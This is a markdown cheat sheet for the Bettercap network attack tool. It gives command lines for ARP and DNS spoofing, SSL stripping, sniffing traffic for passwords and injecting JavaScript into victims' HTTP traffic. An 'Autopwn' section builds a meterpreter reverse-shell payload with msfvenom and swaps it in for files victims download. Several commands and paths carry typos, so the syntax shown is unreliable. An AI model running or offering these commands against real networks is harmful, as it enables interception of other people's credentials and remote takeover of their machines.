# Bettercap

## Install 
```
apt-get install bettercap (if version > 2.x)
```

Otherwise:

```
go get github.com/bettercap/bettercap
```

## Usage

`sudo bettercap -eval "net.probe on; arp.spoof on; net.sniff on; http.proxy on;set http.proxy.sslstrip true;set net.sniff.regexp .*password=.+ ;set net.sniff.output passwords.cap"`

## Usual commands

- net.show : list of hosts 
- net.recon on : start network hosts discovery
- net.probe on : start active network hosts discovery
- net.sniff on : packet sniffing
- net.sniff stats : Examine packet sniffer stats
- net.fuzz on : Turn packet fuzzing on
- ticker on : start the ticker module
- set ticker.period 10
- set ticker.command "clear; net.show; events.show 20"
- set arp.spoof.targets {IPs} : List of target IP addresses 
- arp.spoof on : turn ARP spoofing on
- dns.spoof on : Turn DNS spoofing on
- set dns.spoof.address {IP} : set the IP address to return for spoofed DNS answer
- set dns.spoof.domains {domain} : set a list of domain targets for DNS spoofing
- set dns.spoof.all true : DNS spoofing for all requests regardless of domain
- set dns.spoof.hosts hostfile : DNS spoofing only for the entries mapped in the specified host file
- net.recon on; sleep 30; netrecon off; net show
- set arp.spoof.targets {ip}; set net.sniff.verbose false; set net.sniff.output arpspoof.pcap; net.sniff on; arp.spoof on
- http.proxy on : turn HTTP proxy on
- set http.proxy.sslstrip true : Enable ssstrilp
- set http.proxy.script script.js : inject the JS file contents in every request
- set http.proxy.injectjs javascript : Inject the specified javascript in every request
- https.proxy on : turn on https proxy
- set https.proxy.sslstrip true : turn on sslstrip

## Caplets

Collections of Bettercap commands saved in a file

```
events.clear
set net.sniff.verbose false
set net.sniff.local true
set net.sniff.filter not arp and not udp port 53
net.sniff on
```

`caplets.update`

`caplets.show`

## Bettercap Autopwn

Bettercap Autopwn replace downloaded files with a file or your choose. The payload file should be placed on : /usr/localshare/bettercap/capletsdownload-autopwn/{*plateform*}

`msfvenom -p windows/meterpreter/reverse_tcp lhost=IP lport=PORT -o /usr/local/share/bettercap/caplets/download-autopwn/windows/payload.exe -f exe`

`bettercap -caplet /usr/local/share/bettercap/download-autopwn.cap -eval 'events.ignore endpoint; set arp.spoof.targets IP; arp.spoof on'`

## Links 

https://miloserdov.org/?p=1112

